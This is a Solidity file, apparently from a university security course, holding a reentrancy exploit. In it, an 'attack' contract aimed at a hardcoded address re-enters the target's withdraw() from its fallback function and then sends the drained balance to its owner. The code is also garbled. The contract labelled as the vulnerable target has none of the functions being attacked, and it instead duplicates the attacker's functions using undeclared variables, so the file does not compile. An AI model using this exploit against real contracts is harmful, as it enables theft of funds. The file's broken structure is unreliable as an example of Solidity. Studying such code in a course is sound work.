pragma solidity ^0.6.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)

contract Vuln
{
    function atk() public payable
    {
        count = 0;
        vuln.deposit.value(msg.value)();
    }

    function gimmeGimme() public 
    {
        if(msg.sender == owner)
        {
            msg.sender.send(address(this).balance);
        }
    }
}

contract attack
{
    address payable owner;
    address vuln_contract = 0x36A540E3A78084962B75E25877CfACf8846Be018;
    Vuln public vuln = Vuln(address(vuln_contract));
    uint256 public count;
    
    constructor() public
    {
        owner = msg.sender; 
        count = 0;
    }

    fallback () external payable 
    {
        count += 1;

        if (count <= 2) 
        {
            vuln.withdraw();
        }
    }
    
    
    function atk() public payable
    {
        count = 0;
        vuln.deposit.value(msg.value)();
    }

    function gimmeGimme() public 
    {
        if(msg.sender == owner)
        {
            msg.sender.send(address(this).balance);
        }
    }
}


